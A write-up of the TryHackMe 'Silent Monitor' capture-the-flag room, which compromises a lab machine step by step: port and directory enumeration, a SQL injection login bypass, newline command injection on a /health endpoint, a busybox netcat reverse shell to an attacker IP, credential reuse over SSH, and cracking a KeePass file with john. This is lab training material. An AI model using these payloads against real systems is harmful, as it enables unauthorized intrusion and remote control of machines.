<div style="display: flex; align-items: center; gap: 1rem;">
	<img src="https://cdn-images.tryhackme.com/room-icons/69d514a8a643762d5700ec6f-1779219421762" alt="Silent Monitor" width="100" height="100">
	<h1>Silent Monitor — Write-up</h1>
</div>
<br>
**Platform:** TryHackMe  
**Room:** [Silent Monitor](https://tryhackme.com/room/silent-monitor)  
**Difficulty:** Medium  
**Category:** Linux / Web  

# Scenario
Green Lights, Dark Corners
CorpNet's internal network operations centre has been running quietly for years. Monitoring hosts, logging events, and keeping the infrastructure alive. Or so it seems. A tip from a disgruntled contractor suggests that someone on the NOC team has been cutting corners, leaving doors open, and hiding things in places no one thinks to look.

The portal is up. The services show green. The audit log looks clean.

But clean logs can be written by anyone.

Your job is to get in, move through the system, and find out what is really running behind the secret dashboard.

# Reconnaissance
We start by enumerating the target machine using Nmap to identify open ports and services. The Nmap scan reveals the following:

```bash
nmap -Pn -n -T4 -p- --min-rate=1000 -oN allports.txt 10.130.178.116
```

![nmap](https://i.postimg.cc/y8H21dtc/Screenshot-From-2026-08-19-20-49-11.png)

we can see that the machine has two open ports: 22 (SSH) and a web service on port 5050.

we visit the web service on port 5050 and find a static site.

```
http://silent-monitor.thm:5050
```
![web](https://i.postimg.cc/Gm3tBcsk/Screenshot-From-2026-08-19-23-16-54.png)

A directory scan using Gobuster reveals a hidden directory `/internal` which contains a login page.:

```bash
gobuster dir -u http://silent-monitor.thm:5050/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```
![gobuster](https://i.postimg.cc/13S6vhVh/Screenshot-From-2026-08-19-23-23-11.png)

![login](https://i.postimg.cc/wxPQcGkD/Screenshot-From-2026-08-19-23-29-07.png)

# Access as netops
I try some sqli injection payloads on the username, the payload **' OR 1==1--** works and now i'm logged in as the user `netops`. After logging in, I can see a dashboard.

![dashboard](https://i.postimg.cc/yYZXfyfm/Screenshot-From-2026-08-19-23-37-48.png)

In the dashboard, We can see a `audit logs` sections, i can see that an other user tried to get access via command injection on the `/health` endpoint. So i try to get access via command injection on the same endpoint.

# Shell as www-data
We move to the `/health` endpoint and try to inject a command.
![health](https://i.postimg.cc/W30qG5pG/Screenshot-From-2026-08-19-23-47-02.png)

We try the same payload that was used in the audit logs, but it doesn't work. To bypass the filter, we use the new line character to break the command and execute our own. We put our payload after the new line character, and we can see that the command is executed. We can now get a reverse shell by using the following payload:

```
busybox nc YOUR_ATTAKER_IP 1337 -e bash

```

![payload](https://i.postimg.cc/gJyqzzZD/Screenshot-From-2026-08-19-23-56-52.png)

after executing the payload, we get a reverse shell as the user `www-data`.

![reverse_shell](https://i.postimg.cc/sxwYWTKZ/Screenshot-From-2026-08-19-23-58-32.png)

# Shell as sysadmin
In the directory `/opt/netops`, we can see a file called `secret.config`, which has the credentials for the user `sysadmin`. We can use these credentials to SSH into the machine as `sysadmin`.

![secret.config](https://i.postimg.cc/W37W96XT/Screenshot-From-2026-08-20-00-06-24.png)

```
ssh sysadmin@silent-monitor.thm
```

![sysadmin](https://i.postimg.cc/PxfzqGQx/Screenshot-From-2026-08-20-00-17-32.png)

# Shell as root
In the `backup` directory, we can see keepass files, we can use the `keepass2john` tool to extract the hash from the keepass file and then use `john` to crack the hash and get the password for the user `root`.

![keepass](https://i.postimg.cc/fRhdLnMB/Screenshot-From-2026-08-20-00-19-16.png)

```
keepass2john infrastructure.kdbx > hash.txt
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

after cracking the hash, we get the password for the user `root`. We can now su to root and get the root flag.

![root](https://i.postimg.cc/8k6mwVP2/Screenshot-From-2026-08-19-21-31-07.png)

```bash
su root
```
![root flag](https://i.postimg.cc/Bb9DRXQT/Screenshot-From-2026-08-20-00-27-36.png)

That's it! We have successfully completed the Silent Monitor room on TryHackMe.